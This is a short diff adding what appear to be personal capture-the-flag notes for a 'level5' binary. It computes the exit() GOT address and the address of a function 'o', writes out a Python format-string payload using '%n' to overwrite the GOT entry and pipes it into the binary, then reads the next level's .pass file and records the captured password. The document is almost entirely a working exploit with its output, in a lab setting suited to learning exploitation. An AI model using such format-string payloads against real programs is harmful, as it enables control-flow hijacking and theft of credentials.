@@ -1,0 +1,23 @@
+
+
+objdump -R level5 | grep -i exit => 0x08049838 
+
+address of o: 0x080484a4
+
+decimal : 134513828
+
+4 + 16 + ? = 134513828
+
+
+
+134513808
+
+payload:
+
+python -c "print '\x38\x98\x04\x08' + '%8x' * 2 + '%134513808x' +  '%n' " > /tmp/ok3 && cat  /tmp/ok3  - | ./level5
+
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+
